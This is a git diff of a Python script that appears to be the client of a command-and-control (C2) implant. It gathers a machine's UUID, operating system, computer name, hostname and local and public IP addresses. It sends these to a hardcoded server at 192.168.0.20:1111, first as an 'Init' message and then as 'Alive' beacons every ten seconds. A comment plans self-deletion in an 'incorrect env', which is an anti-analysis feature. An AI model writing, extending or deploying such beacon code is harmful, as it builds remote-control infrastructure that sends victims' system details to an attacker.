@@ -1,3 +1,6 @@
+#!/usr/bin/env python
+# coding: utf-8
+
 import os
 import sys
 import time
@@ -5,6 +8,7 @@ from time import gmtime, strftime
 import socket
 import getpass
 import uuid
+import threading
 
 # TO DO : Check internet connexion
 # To DO : Auto Deletion in incorrect env
@@ -33,13 +37,14 @@ date = strftime("%d:%m:%Y:%H:%M:%S:+0000", gmtime())
 Chaine = "Init:" + date + "," + str(UUID) + "," + Os + "," + Computer + "," + Loacl_ip + "," + Hostname + "," +Public_ip
 s.send(Chaine.encode())
 s.close()
+# Socket for keep-alive connexion
 
 while True:
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect(("192.168.0.20", 1111))
+
     time.sleep(10)
     date = strftime("%d:%m:%Y:%H:%M:%S:+0000", gmtime())
     Chaine = "Alive:" + date + "," + str(UUID) + "," + Os + "," + Computer + "," + Loacl_ip + "," + Hostname + "," + Public_ip
     s.send(Chaine.encode())
     print("[DEBUG] I'm Alive and seems connected to the C2 server.")
-    s.close()
